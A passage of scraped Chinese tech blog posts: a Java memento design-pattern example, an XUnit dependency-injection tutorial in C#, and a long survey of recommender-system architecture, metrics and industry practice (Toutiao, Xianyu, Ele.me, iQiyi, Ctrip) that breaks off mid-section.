package name.ealen.memento.designPattern;

/**
 * Created by EalenXie on 2018/9/27 18:02.
 */
public class Originator {

    private String name;
    private String sex;
    private Integer age;

    //创建一个备份
    public Memento createMemento() {
        return new Memento(name, sex, age);
    }

    //根据备份进行rollback
    public void rollbackByMemento(Memento memento) {
        this.name = memento.getName();
        this.sex = memento.getSex();
        this.age = memento.getAge();
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getSex() {
        return sex;
    }

    public void setSex(String sex) {
        this.sex = sex;
    }

    public Integer getAge() {
        return age;
    }

    public void setAge(Integer age) {
        this.age = age;
    }

    public Originator(String name, String sex, Integer age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Originator{" +
                "name='" + name + '\'' +
                ", sex='" + sex + '\'' +
                ", age=" + age +
                '}';
    }
}

 
　　3 . 为了防止发起者与备份对象的过度耦合，以及防止对发起者行和属性进行过多的代码侵入，我们通常将Memento对象交由CareTaker来进行管理 : 
 

package name.ealen.memento.designPattern;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by EalenXie on 2018/9/27 17:39.
 */
public class CareTaker {

    private Map<String, Memento> mementos = new HashMap<>(); //一个或者多个备份录

    //保存默认备份
    public void saveDefaultMemento(Memento memento) {
        mementos.put("default", memento);
    }

    //获取默认备份
    public Memento getMementoByDefault() {
        return mementos.get("default");
    }

    //根据备份名 保存备份
    public void saveMementoByName(String mementoName, Memento memento) {
        mementos.put(mementoName, memento);
    }

    //根据备份名 获取备份
    public Memento getMementoByName(String mementoName) {
        return mementos.get(mementoName);
    }

    //删除默认备份
    public void deleteDefaultMemento() {
        mementos.remove("default");
    }

    //根据备份名 删除备份
    public void deleteMementoByName(String mementoName) {
        mementos.remove(mementoName);
    }
}

 
　　4 . 此时，我们要进行备份以及rollback，做法如下 : 
 

    /**
     * 备忘录模式,标准实现
     */
    @Test
    public void designPattern() {
        Originator originator = new Originator("ealenxie", "男", 22);
        CareTaker careTaker = new CareTaker();

        //新建一个默认备份,将Originator的初始属性赋值进去
        careTaker.saveDefaultMemento(originator.createMemento());

        //初始化的Originator
        System.out.println("初始化的对象 : " + originator);

        //修改后的Originator
        originator.setName("ZHANG SAN");
        originator.setSex("女");
        originator.setAge(23);
        System.out.println("第一次修改后的对象 : " + originator);

        //新建一个修改后的备份
        careTaker.saveMementoByName("第一次修改备份", originator.createMemento());

        //根据默认备份还原rollback后的Originator
        originator.rollbackByMemento(careTaker.getMementoByDefault());
        System.out.println("还原后的对象 : " + originator);

        //根据备份名还原rollback后的Originator
        originator.rollbackByMemento(careTaker.getMementoByName("第一次修改备份"));
        System.out.println("第一次修改备份 : " + originator);

        //再创建一个默认备份
        careTaker.saveDefaultMemento(originator.createMemento());
        originator.rollbackByMemento(careTaker.getMementoByDefault());
        System.out.println("最后创建的默认备份 : " + originator);
    }

 
运行可以看到如下结果 : 
　　
 以上，使用备忘录的设计模式，好处是显而易见的，我们应该关注的是对象本身具有的(备份/rollback)的行为，而非对象之间的赋值。
 有兴趣的朋友可以看看以上源码 : https://github.com/EalenXie/DesignPatterns 
********************************************************************************************************************************************************************************************************
XUnit 依赖注入
XUnit 依赖注入
Intro
现在的开发中越来越看重依赖注入的思想，微软的 Asp.Net Core 框架更是天然集成了依赖注入，那么在单元测试中如何使用依赖注入呢？
本文主要介绍如何通过 XUnit 来实现依赖注入， XUnit 主要借助 SharedContext 来共享一部分资源包括这些资源的创建以及释放。
Scoped
针对 Scoped 的对象可以借助 XUnit 中的 IClassFixture 来实现

定义自己的 Fixture，需要初始化的资源在构造方法里初始化，如果需要在测试结束的时候释放资源需要实现 IDisposable 接口
需要依赖注入的测试类实现接口 IClassFixture<Fixture>
在构造方法中注入实现的 Fixture 对象，并在构造方法中使用 Fixture 对象中暴露的公共成员

Singleton
针对 Singleton 的对象可以借助 XUnit 中的 ICollectionFixture 来实现

定义自己的 Fixture，需要初始化的资源在构造方法里初始化，如果需要在测试结束的时候释放资源需要实现 IDisposable 接口
创建 CollectionDefinition，实现接口 ICollectionFixture<Fixture>，并添加一个 [CollectionDefinition("CollectionName")] Attribute，CollectionName 需要在整个测试中唯一，不能出现重复的 CollectionName
在需要注入的测试类中添加 [Collection("CollectionName")] Attribute，然后在构造方法中注入对应的 Fixture

Tips

如果有多个类需要依赖注入，可以通过一个基类来做，这样就只需要一个基类上添加 [Collection("CollectionName")] Attribute，其他类只需要集成这个基类就可以了

Samples
Scoped Sample
这里直接以 XUnit 的示例为例：
public class DatabaseFixture : IDisposable
{
    public DatabaseFixture()
    {
        Db = new SqlConnection("MyConnectionString");

        // ... initialize data in the test database ...
    }

    public void Dispose()
    {
        // ... clean up test data from the database ...
    }

    public SqlConnection Db { get; private set; }
}

public class MyDatabaseTests : IClassFixture<DatabaseFixture>
{
    DatabaseFixture fixture;

    public MyDatabaseTests(DatabaseFixture fixture)
    {
        this.fixture = fixture;
    }


    [Fact]
    public async Task GetTest()
    {
        // ... write tests, using fixture.Db to get access to the SQL Server ...
        // ... 在这里使用注入 的 DatabaseFixture
    }
}
Singleton Sample
这里以一个对 Controller 测试的测试为例

自定义 Fixture
    /// <summary>
    /// A test fixture which hosts the target project (project we wish to test) in an in-memory server.
    /// </summary>
    public class TestStartupFixture : IDisposable
    {
        private readonly IWebHost _server;
        public IServiceProvider Services { get; }

        public HttpClient Client { get; }

        public string ServiceBaseUrl { get; }

        public TestStartupFixture()
        {
            var builder = WebHost.CreateDefaultBuilder()
                .UseUrls($"http://localhost:{GetRandomPort()}")
                .UseStartup<TestStartup>();

            _server = builder.Build();
            _server.Start();

            var url = _server.ServerFeatures.Get<IServerAddressesFeature>().Addresses.First();
            Services = _server.Services;
            ServiceBaseUrl = $"{url}/api/";

            Client = new HttpClient()
            {
                BaseAddress = new Uri(ServiceBaseUrl)
            };

            Initialize();
        }

        /// <summary>
        /// TestDataInitialize
        /// </summary>
        private void Initialize()
        {
            // ...
        }

        public void Dispose()
        {
            Client.Dispose();
            _server.Dispose();
        }

        private static readonly Random Random = new Random();

        private static int GetRandomPort()
        {
            var activePorts = IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpListeners().Select(_ => _.Port).ToList();

            var randomPort = Random.Next(10000, 65535);

            while (activePorts.Contains(randomPort))
            {
                randomPort = Random.Next(10000, 65535);
            }

            return randomPort;
        }
    }
自定义Collection
    [CollectionDefinition("TestCollection")]
    public class TestCollection : ICollectionFixture<TestStartupFixture>
    {
    }
自定义一个 TestBase
    [Collection("TestCollection")]
    public class ControllerTestBase
    {
        protected readonly HttpClient Client;
        protected readonly IServiceProvider ServiceProvider;

        public ControllerTestBase(TestStartupFixture fixture)
        {
            Client = fixture.Client;
            ServiceProvider = fixture.Services;
        }
    }
需要依赖注入的Test类写法

    public class AttendancesTest : ControllerTestBase
    {
        public AttendancesTest(TestStartupFixture fixture) : base(fixture)
        {
        }

        [Fact]
        public async Task GetAttendances()
        {
            var response = await Client.GetAsync("attendances");
            Assert.Equal(HttpStatusCode.OK, response.StatusCode);

            response = await Client.GetAsync("attendances?type=1");
            Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        }
    }
Reference

https://xunit.github.io/docs/shared-context.html

Contact
如果您有什么问题，欢迎随时联系我
Contact me: weihanli@outlook.com

********************************************************************************************************************************************************************************************************
学习这篇总结后，你也能做出头条一样的推荐系统
欢迎大家前往腾讯云+社区，获取更多腾讯海量技术实践干货哦~

本文由jj发表于云+社区专栏

一、推荐系统概述
1.1 概述
推荐系统目前几乎无处不在，主流的app都基本应用到了推荐系统。例如，旅游出行，携程、去哪儿等都会给你推荐机票、酒店等等；点外卖，饿了么、美团等会给你推荐饭店；购物的时候，京东、淘宝、亚马逊等会给你推荐“可能喜欢”的物品；看新闻，今日头条、腾讯新闻等都会给你推送你感兴趣的新闻....几乎所有的app应用或网站都存在推荐系统。
究其根本的原因，推荐系统的流行是因为要去解决一个问题：物品越来越多，信息越来越多，而人的精力和时间是有限的，需要一个方式去更有效率地获取信息，链接人与信息。
推荐系统就是为了解决这一问题而诞生的，在海量的物品和人之间，架起来一条桥梁。它就像一个私人的专属导购，根据你的历史行为、个人信息等等，为每个人diy进行推荐，千人前面，帮助人们更好、更快地选择自己感兴趣的、自己需要的东西。今日头条系的feed流在推荐算法的加持下，短短几年的用户增长速度和使用时长数据令人咂舌，受到了市场的追捧和高估值。一夜之间，几乎所有的app都开始上feed流、上各种推荐，重要性可见一斑。
1.2 基本架构
我们先把推荐系统简单来看，那么它可以简化为如下的架构。
图1 推荐系统一般流程
不管是复杂还是简单的推荐系统，基本都包含流程：

1）结果展示部分。不管是app还是网页上，会有ui界面用于展示推荐列表。
2）行为日志部分。用户的各种行为会被时刻记录并被上传到后台的日志系统，例如点击行为、购买行为、地理位置等等。这些数据后续一般会被进行ETL（extract抽取、transform转换、load加载），供迭代生成新模型进行预测。
3）特征工程部分。得到用户的行为数据、物品的特征、场景数据等等，需要人工或自动地去从原始数据中抽取出特征。这些特征作为输入，为后面各类推荐算法提供数据。特征选取很重要，错的特征必定带来错误的结果。
4）召回部分。 有了用户的画像，然后利用数据工程和算法的方式，从千万级的产品中锁定特定的候选集合，完成对推荐列表的初步筛选，其在一定程度上决定了排序阶段的效率和推荐结果的优劣。
5）排序部分。针对上一步的候选集合，会进行更精细化地打分、排序，同时考虑新颖性、惊喜度、商业利益等的一系列指标，获得一份最终的推荐列表并进行展示。

完整的推荐系统还会包括很多辅助模块，例如线下训练模块，让算法研究人员利用真实的历史数据，测试各类不同算法，初步验证算法优劣。线下测试效果不错的算法就会被放到线上测试，即常用的A/B test系统。它利用流量分发系统筛选特定的用户展示待测试算法生成的推荐列表，然后收集这批特定用户行为数据进行线上评测。
图2 蘑菇街推荐系统架构
推荐系统每个部分可大可小，从图2可知，各部分涉及的技术栈也较多。终端app每时每刻都在不断上报各类日志，点击、展示、时间、地理位置等等信息，这些海量信息需要依赖大数据相关软件栈支持，例如Kafka、spark、HDFS、Hive等，其中Kafka常被用于处理海量日志上报的消费问题。将数据进行ETL后存入Hive数据仓库，就可进行各类线上、线下测试使用。线下的算法会上线到线上环境进行ABtest，ABtest涉及完整的测试回路打通，不然拿不到结果，也无法快速开发迭代算法。线上推荐系统还要关注实时特征、离线特征，在性能和各类指标、商业目标间取均衡。
1.3 评测指标
一个东西做得好还是不好，能不能优化，首要前提是确定评测指标。只有确定了评测指标，才能有优化的方向。评测推荐系统的指标可以考虑以下几个方面：
1.3.1 用户满意度
用户作为推进系统的主要参与者，其满意度是评测系统的最重要指标。满意度可以通过做用户调查或线上实验获得。在在线系统中，一般通过对用户行为的统计得到，例如点击率、用户停留时间和转化率等指标度量用户的满意度。
1.3.2 预测精确度precision
预测准确度度量一个推荐系统或者推荐算法预测用户行为的能力。这个指标是最重要的离线评测指标。由于离线数据可计算，绝大部分科研人员都在讨论这个指标。
评分预测问题一般使用RMSE、MAE等，TopN预测问题一般使用Recall、Precision等。
图3 常见的指标准确率(Precision)、召回率(Recall)、误检率
其实目前国内很多地方和资料混淆了两个指标的叫法，把准确度对应英文precision指标。不过尽量还是用英文比较好。
准确度Accuracy = (TP + TN) / (TP + FP + TN + FN)
精确度Precision=TP/(TP+FP)
1.3.3 覆盖率coverage
覆盖率描述一个推荐系统对物品长尾的发掘能力。覆盖率有很多定义方法，最简单的计算就是推荐列表中的物品数量，除以所有的物品数量。
在信息论和经济学中有两个著名的指标用来定义覆盖率，一个是信息熵，一个是基尼系数。具体公式和介绍可以google。
ps：长尾在推荐系统中是个常见的名词。举个例子帮助大家理解，在商店里，由于货架和场地有限，摆在最显眼的地方的物品通常是出名的、热门的，从而销量也是最好的。很多不出名或者小知名度的商品由于在货架角落或者根本上不了货架，这些商品销量很差。在互联网时代，这一现象会被打破。电子商城拥有几乎无限长的“货架”，它可以为用户展现很多满足他小众需求的商品，这样总的销量加起来将远远超过之前的模式。
Google是一个最典型的“长尾”公司，其成长历程就是把广告商和出版商的“长尾”商业化的过程。数以百万计的小企业和个人，此前他们从未打过广告，或从没大规模地打过广告。他们小得让广告商不屑一顾，甚至连他们自己都不曾想过可以打广告。但Google的AdSense把广告这一门槛降下来了：广告不再高不可攀，它是自助的，价廉的，谁都可以做的；另一方面，对成千上万的Blog站点和小规模的商业网站来说，在自己的站点放上广告已成举手之劳。Google目前有一半的生意来自这些小网站而不是搜索结果中放置的广告。数以百万计的中小企业代表了一个巨大的长尾广告市场。这条长尾能有多长，恐怕谁也无法预知。无数的小数积累在一起就是一个不可估量的大数，无数的小生意集合在一起就是一个不可限量的大市场。
图4 长尾曲线
1.3.4多样性
用户的兴趣是多样的，推荐系统需要能覆盖用户各种方面的喜好。这里有个假设，如果推荐列表比较多样，覆盖了用户各种各样的兴趣，那么真实命中用户的兴趣概率也会越大，那么就会增加用户找到自己感兴趣的物品的概率。
1.3.5 新颖性
新颖的推荐是指给用户推荐那些他们以前没有听说过的物品。要准确地统计新颖性需要做用户调查。
1.3.6 惊喜度
如果推荐结果和用户的历史兴趣不相似，但却让用户觉得满意，那么就可以说推荐结果的惊喜度很高，而推荐的新颖性仅仅取决于用户是否听说过这个推荐结果。
1.3.7 信任度
用户对推荐系统的信任程度。如果用户信任推荐系统，那就会增加用户和推荐系统的交互。特别是在电子商务推荐系统中，让用户对推荐结果产生信任是非常重要的。同样的推荐结果，以让用户信任的方式推荐给用户就更能让用户产生购买欲，而以类似广告形式的方法推荐给用户就可能很难让用户产生购买的意愿。提高推荐系统的信任度主要有两种方法。首先需要增加推荐系统的透明度（transparency），而增加推荐系统透明度的主要办法是提供推荐解释。其次是考虑用户的社交网络信息，利用用户的好友信息给用户做推荐，并且用好友进行推荐解释。
1.3.8 实时性
在很多网站中，因为物品（新闻、微博等）具有很强的时效性，所以需要在物品还具有时效性时就将它们推荐给用户。因此，在这些网站中，推荐系统的实时性就显得至关重要。
推荐系统的实时性包括两个方面。首先，推荐系统需要实时地更新推荐列表来满足用户新的行为变化。实时性的第二个方面是推荐系统需要能够将新加入系统的物品推荐给用户。这主要考验了推荐系统处理物品冷启动的能力。
1.3.9 健壮性
衡量了一个推荐系统抗击作弊的能力。算法健壮性的评测主要利用模拟攻击。首先，给定一个数据集和一个算法，可以用这个算法给这个数据集中的用户生成推荐列表。然后，用常用的攻击方法向数据集中注入噪声数据，然后利用算法在注入噪声后的数据集上再次给用户生成推荐列表。最后，通过比较攻击前后推荐列表的相似度评测算法的健壮性。如果攻击后的推荐列表相对于攻击前没有发生大的变化，就说明算法比较健壮。
1.3.10 商业目标
很多时候，评测推荐系统更加注重商业目标是否达成，而商业目标和盈利模式是息息相关的。一般来说，最本质的商业目标就是平均一个用户给公司带来的盈利。不过这种指标不是很难计算，只是计算一次需要比较大的代价。因此，很多公司会根据自己的盈利模式设计不同的商业目标。
1.3.11 参考资料
推荐系统的评测问题有很多的相关研究和资料，预详细研究可阅读参考：

《推荐系统实战》
《Evaluating Recommendation Systems》
What metrics are used for evaluating recommender systems?

二、常用算法
推荐算法的演化可以简单分为3个阶段，也是推荐系统由简单到复杂的迭代。
2.1 推荐算法演化
2.1.1 人工运营
这个阶段是随机的，人工根据运营目的，手工给特定类别的用户推送特定的内容。
优点是：

方便推广特定的内容；
推荐的内容易解释；

缺点是：

千人一面，推送的内容一样；
人工筛选，推送，耗费人力巨大；
运营根据自己的知识，主观性比较大；

2.1.2 基于统计的推荐
会基于一些简单的统计学知识做推荐，例如某个内别卖得最好的热门榜；再细致一些，将用户按个人特质划分，再求各种热度榜等。
优点是：

热门就是大部分用户喜好的拟合，效果好；
推荐的内容易解释；

缺点是：

千人一面，推送的内容一样；
马太效应，热门的会越来越热门，冷门的越来越冷门；
效果很容易达到天花板；

2.1.3 个性化推荐
当前阶段的推荐，会基于协同过滤算法、基于模型的算法、基于社交关系等，机器学习、深度学习逐渐引入，提高了推荐效果。
优点是：

效果要相对于之前，要好很多；
千人前面，每个人都有自己独特的推荐列表；

缺点是：

门槛较高，推荐系统搭建、算法设计、调优等等，都对开发者有较高的要求；
成本较高，而且是个长期迭代优化的过程，人力物力投入很高；

2.2 推荐算法汇总
内部一个分享这样分类常用的推荐算法：
图5 推荐算法分类
这里提到的Memory-based算法和Model-based算法的差别是什么？这也是我之前关注的问题，找到个资料，讲解得比较透彻。
Memory-based techniques use the data (likes, votes, clicks, etc) that you have to establish correlations (similarities?) between either users (Collaborative Filtering) or items (Content-Based Recommendation) to recommend an item i to a user u who’s never seen it before. In the case of collaborative filtering, we get the recommendations from items seen by the user’s who are closest to u, hence the term collaborative. In contrast, content-based recommendation tries to compare items using their characteristics (movie genre, actors, book’s publisher or author… etc) to recommend similar new items.
In a nutshell, memory-based techniques rely heavily on simple similarity measures (Cosine similarity, Pearson correlation, Jaccard coefficient… etc) to match similar people or items together. If we have a huge matrix with users on one dimension and items on the other, with the cells containing votes or likes, then memory-based techniques use similarity measures on two vectors (rows or columns) of such a matrix to generate a number representing similarity.
Model-based techniques on the other hand try to further fill out this matrix. They tackle the task of “guessing” how much a user will like an item that they did not encounter before. For that they utilize several machine learning algorithms to train on the vector of items for a specific user, then they can build a model that can predict the user’s rating for a new item that has just been added to the system.
Since I’ll be working on news recommendations, the latter technique sounds much more interesting. Particularly since news items emerge very quickly (and disappear also very quickly), it makes sense that the system develops some smart way of detecting when a new piece of news will be interesting to the user even before other users see/rate it.
Popular model-based techniques are Bayesian Networks, Singular Value Decomposition, and Probabilistic Latent Semantic Analysis (or Probabilistic Latent Semantic Indexing). For some reason, all model-based techniques do not enjoy particularly happy-sounding names.

《携程个性化推荐算法实践》一文中梳理了工业界应用的排序模型，大致经历三个阶段：
图6 排序模型演进
本文不对上面的这些算法进行详细的原理探讨，会比较复杂，有兴趣可以再自行学习。
2.3 CF算法示例
为了学习这块的技术知识，跟着参加了下内部举办的srtc推荐比赛。重在参与，主要是学习整个基本流程，体会下推荐场景，了解腾讯内部做得好的团队和产品是什么样子。
2.3.1（内部敏感资料，删除）
2.3.2 CF算法
在web平台上点一点，可能失去了学习的意义。所以本着学习的态度，我在线下自己的机器上实现了一些常用的算法，例如CF等。
推荐算法里CF算是比较常见的，核心还是很简单的。

user-cf基本原理

A.找到和目标用户兴趣相似的的用户集合； B.找到这个集合中的用户喜欢的，且目标用户没听过的物品推荐给目标用户。

item-cf基本原理

A.计算物品之间的相似度； B.根据物品的相似度和用户的历史行为给用户生成推荐列表。
结合前面总结的，cf属于memory-base的算法，很大一个特征就是会用到相似度的函数。这个user-cf需要计算用户兴趣的相似度，item-cf需要计算物品间的相似度。基于相似度函数的选择、编程语言的选择、实现方式的选择、优化的不同，结果和整个运行时间会很大不同。当时就简单用python实现的，8个process跑满cpu同时处理，需要近10个小时跑完。后面了解到有底层进行过优化的pandas、numpy等，基于这些工具来实现速度会快很多。
2.3.3 收获
哈哈，第一次参加这种比赛，虽然成绩很差，但自己觉得很是学到很多东西，基本达到了参赛的目的。在真实的场景和数据下去思考各种影响因素，体会各种算法从设计、实现、训练、评价等各阶段，很多东西确实比看资料和书来得更深入。果然实践才是学习的最好手段。如果想更深入去搞推荐算法这块，感觉需要继续学习目前各种热门算法的原理、潜规则，kaggle上多练手，以及锻炼相关的平台及工程化能力。
三、业界推荐系统调研
收集、研究了下网上一些推荐系统落地总结的文章，可以开拓视野，加深整体理解。
以下只是一些重要内容，有兴趣可以阅读原文：

《今日头条算法原理》，原文链接
《推荐算法在闲鱼小商品池的探索与实践》，原文链接
《饿了么推荐系统：从0到1》，原文链接
《爱奇艺个性化推荐排序实践》，原文链接
《携程个性化推荐算法实践》，原文链接
《蘑菇街推荐工程实践》，原文链接

3.1 今日头条推荐系统
今日头条算法架构师曹欢欢博士，做过一次 《今日头条算法原理》的报告。主要涉及4部分：系统概览、内容分析、用户标签、评估分析。

四类典型推荐特征


第一类是相关性特征，就是评估内容的属性和与用户是否匹配。 第二类是环境特征，包括地理位置、时间。这些既是bias特征，也能以此构建一些匹配特征。 第三类是热度特征。包括全局热度、分类热度，主题热度，以及关键词热度等。 第四类是协同特征，它可以在部分程度上帮助解决所谓算法越推越窄的问题。

模型的训练上，头条系大部分推荐产品采用实时训练


模型的训练上，头条系大部分推荐产品采用实时训练。实时训练省资源并且反馈快，这对信息流产品非常重要。用户需要行为信息可以被模型快速捕捉并反馈至下一刷的推荐效果。我们线上目前基于storm集群实时处理样本数据，包括点击、展现、收藏、分享等动作类型。模型参数服务器是内部开发的一套高性能的系统，因为头条数据规模增长太快，类似的开源系统稳定性和性能无法满足，而我们自研的系统底层做了很多针对性的优化，提供了完善运维工具，更适配现有的业务场景。
目前，头条的推荐算法模型在世界范围内也是比较大的，包含几百亿原始特征和数十亿向量特征。整体的训练过程是线上服务器记录实时特征，导入到Kafka文件队列中，然后进一步导入Storm集群消费Kafka数据，客户端回传推荐的label构造训练样本，随后根据最新样本进行在线训练更新模型参数，最终线上模型得到更新。这个过程中主要的延迟在用户的动作反馈延时，因为文章推荐后用户不一定马上看，不考虑这部分时间，整个系统是几乎实时的。

但因为头条目前的内容量非常大，加上小视频内容有千万级别，推荐系统不可能所有内容全部由模型预估。所以需要设计一些召回策略，每次推荐时从海量内容中筛选出千级别的内容库。召回策略最重要的要求是性能要极致，一般超时不能超过50毫秒。

用户标签工程挑战更大


内容分析和用户标签是推荐系统的两大基石。内容分析涉及到机器学习的内容多一些，相比而言，用户标签工程挑战更大。 今日头条常用的用户标签包括用户感兴趣的类别和主题、关键词、来源、基于兴趣的用户聚类以及各种垂直兴趣特征（车型，体育球队，股票等）。还有性别、年龄、地点等信息。性别信息通过用户第三方社交账号登录得到。年龄信息通常由模型预测，通过机型、阅读时间分布等预估。常驻地点来自用户授权访问位置信息，在位置信息的基础上通过传统聚类的方法拿到常驻点。常驻点结合其他信息，可以推测用户的工作地点、出差地点、旅游地点。这些用户标签非常有助于推荐。

当然最简单的用户标签是浏览过的内容标签。但这里涉及到一些数据处理策略。主要包括：一、过滤噪声。通过停留时间短的点击，过滤标题党。二、热点惩罚。对用户在一些热门文章（如前段时间PG One的新闻）上的动作做降权处理。理论上，传播范围较大的内容，置信度会下降。三、时间衰减。用户兴趣会发生偏移，因此策略更偏向新的用户行为。因此，随着用户动作的增加，老的特征权重会随时间衰减，新动作贡献的特征权重会更大。四、惩罚展现。如果一篇推荐给用户的文章没有被点击，相关特征（类别，关键词，来源）权重会被惩罚。当然同时，也要考虑全局背景，是不是相关内容推送比较多，以及相关的关闭和dislike信号等。

Hadoop集群压力过大，上线 Storm集群流式计算系统


面对这些挑战。2014年底今日头条上线了用户标签Storm集群流式计算系统。改成流式之后，只要有用户动作更新就更新标签，CPU代价比较小，可以节省80%的CPU时间，大大降低了计算资源开销。同时，只需几十台机器就可以支撑每天数千万用户的兴趣模型更新，并且特征更新速度非常快，基本可以做到准实时。这套系统从上线一直使用至今。

很多公司算法做的不好，并非是工程师能力不够，而是需要一个强大的实验平台，还有便捷的实验分析工具


A/B test系统原理

这是头条A/B Test实验系统的基本原理。首先我们会做在离线状态下做好用户分桶，然后线上分配实验流量，将桶里用户打上标签，分给实验组。举个例子，开一个10%流量的实验，两个实验组各5%，一个5%是基线，策略和线上大盘一样，另外一个是新的策略。

实验过程中用户动作会被搜集，基本上是准实时，每小时都可以看到。但因为小时数据有波动，通常是以天为时间节点来看。动作搜集后会有日志处理、分布式统计、写入数据库，非常便捷。
3.2 推荐算法在闲鱼小商品池的探索与实践

闲鱼中个性化推荐流程


商品个性化推荐算法主要包含Match和Rank两个阶段：Match阶段也称为商品召回阶段，在推荐系统中用户对商品的行为称为用户Trigger，通过长期收集用户作用在商品上的行为，建立用户行为和商品的矩阵称为X2I，最后通过用户的Trigger和关系矩阵X2I进行商品召回。Rank阶段利用不同指标的目标函数对商品进行打分，根据推荐系统的规则对商品的多个维度进行综合排序。下面以闲鱼的首页feeds为例，简单介绍闲鱼的个性化推荐流程。
所示步骤1.1，利用用户的信息获取用户Trigger，用户信息包括用户的唯一标识userId，用户的设备信息唯一标识uttid。
所示步骤1.2，返回用户Trigger其中包括用户的点击、购买过的商品、喜欢的类目、用户的标签、常逛的店铺、购物车中的商品、喜欢的品牌等。
所示步骤1.3，进行商品召回，利用Trigger和X2I矩阵进行join完成对商品的召回。
所示步骤1.4，返回召回的商品列表，在商品召回中一般以I2I关系矩阵召回的商品为主，其他X2I关系矩阵召回为辅助。
步骤2.1，进行商品过滤，对召回商品进行去重，过滤购买过的商品，剔除过度曝光的商品。
所示步骤2.2，进行商品打分，打分阶段利用itemInfo和不同算法指标对商品多个维度打分。
步骤2.3，进行商品排序，根据规则对商品多个维度的分数进行综合排序。
步骤2.4，进行返回列表截断，截断TopN商品返回给用户。
闲鱼通过以上Match和Rank两个阶段八个步骤完成商品的推荐，同时从图中可以看出为了支持商品的个性化推荐，需要对X2I、itemInfo、userTrigger数据回流到搜索引擎，这些数据包含天级别回流数据和小时级别回流数据。

小商品的特点

小商品池存在以下几个特点。
实时性：在闲鱼搭建的小商品池中要求商品可以实时的流入到该规则下的商品池，为用户提供最新的优质商品。
周期性：在小商品池中，很多商品拥有周期属性，例如免费送的拍卖场景，拍卖周期为6小时，超过6小时后将被下架。
目前频道导购页面大多还是利用搜索引擎把商品呈现给用户，为了保证商品的曝光，一般利用搜索的时间窗口在商品池中对商品进一步筛选，但是仍存在商品曝光的问题，如果时间窗口过大，那么将会造成商品过度曝光，如果商品窗口过小那么就会造成商品曝光不足，同时还存在一个搜索无法解决的问题，同一时刻每个用户看到的商品都是相同的，无法针对用户进行个性化推荐，为了进一步提升对用户的服务，小商品池亟需引入个性化推荐。

推荐在小商品池的解决方案

在上文中利用全站X2I数据对小商品池的商品进行推荐过程中，发现在Match阶段，当小商品池过小时会造成商品召回不足的问题，为了提升小商品池推荐过程中有效召回数量，提出了如下三种解决方案。
提前过滤法：数据回流到搜索引擎前，小商品池对数据进行过滤，产生小商品池的回流数据，在商品进行召回阶段，利用小商品池的X2I进行商品召回，以此提升商品的召回率。

商品向量化法： 在Match阶段利用向量相似性进行商品召回，商品向量化是利用向量搜索的能力，把商品的特性和规则通过函数映射成商品向量，同时把用户的Trigger和规则映射成用户向量，文本转换向量常用词袋模型和机器学习方法，词袋模型在文本长度较短时可以很好的把文本用词向量标识，但是文本长度过长时受限于词袋大小，如果词袋过小效果将会很差，机器学习的方法是利用Word2Vector把文本训练成向量，根据经验值向量维度一般为200维时效果较好。然后利用向量搜索引擎，根据用户向量搜索出相似商品向量，以此作为召回的商品。如图5所示商品的向量分两部分，前20位代表该商品的规则，后200位代表商品的基本特征信息。

商品搜索引擎法： 在Match阶段利用商品搜索引擎对商品进行召回，如图6所示在商品进入搜索引擎时，对商品结构进行理解，在商品引擎中加入Tag和规则，然后根据用户的Trigger和规则作为搜索条件，利用搜索引擎完成商品的召回。搜索引擎的天然实时性解决了小商品池推荐强实时性的问题。

3.3 饿了么推荐系统：从0到1
对于任何一个外部请求, 系统都会构建一个QueryInfo(查询请求), 同时从各种数据源提取UserInfo(用户信息)、ShopInfo(商户信息)、FoodInfo(食物信息)以及ABTest配置信息等, 然后调用Ranker排序。以下是排序的基本流程(如下图所示)：
#调取RankerManager, 初始化排序器Ranker：

根据ABTest配置信息, 构建排序器Ranker；

调取ScorerManger, 指定所需打分器Scorer(可以多个); 同时, Scorer会从ModelManager获取对应Model, 并校验；

调取FeatureManager, 指定及校验Scorer所需特征Features。

#调取InstanceBuilder, 汇总所有打分器Scorer的特征, 计算对应排序项EntityInfo(餐厅/食物)排序所需特征Features；
#对EntityInfo进行打分, 并按需对Records进行排序。

这里需要说明的是：任何一个模型Model都必须以打分器Scorer形式展示或者被调用。主要是基于以下几点考虑：

模型迭代：比如同一个Model，根据时间、地点、数据抽样等衍生出多个版本Version；

模型参数：比如组合模式(见下一小节)时的权重与轮次设定，模型是否支持并行化等；

特征参数：特征Feature计算参数，比如距离在不同城市具有不同的分段参数。

3.4 爱奇艺个性化推荐排序实践
我们的推荐系统主要分为两个阶段，召回阶段和排序阶段。
召回阶段根据用户的兴趣和历史行为，同千万级的视频库中挑选出一个小的候选集（几百到几千个视频）。这些候选都是用户感兴趣的内容，排序阶段在此基础上进行更精准的计算，能够给每一个视频进行精确打分，进而从成千上万的候选中选出用户最感兴趣的少量高质量内容（十几个视频）。

推荐系统的整体结构如图所示，各个模块的作用如下：
用户画像：包含用户的人群属性、历史行为、兴趣内容和偏好倾向等多维度的分析，是个性化的基石
特征工程：包含了了视频的类别属性，内容分析，人群偏好和统计特征等全方位的描绘和度量，是视频内容和质量分析的基础
召回算法：包含了多个通道的召回模型，比如协同过滤，主题模型，内容召回和SNS等通道，能够从视频库中选出多样性的偏好内容
排序模型：对多个召回通道的内容进行同一个打分排序，选出最优的少量结果。
除了这些之外推荐系统还兼顾了推荐结果的多样性，新鲜度，逼格和惊喜度等多个维度，更能够满足用户多样性的需求。
然后，介绍了推荐排序系统架构、推荐机器学习排序算法演进。
3.5 携程个性化推荐算法实践
推荐流程大体上可以分为3个部分，召回、排序、推荐结果生成，整体的架构如下图所示。

召回阶段，主要是利用数据工程和算法的方式，从千万级的产品中锁定特定的候选集合，完成对产品的初步筛选，其在一定程度上决定了排序阶段的效率和推荐结果的优劣。
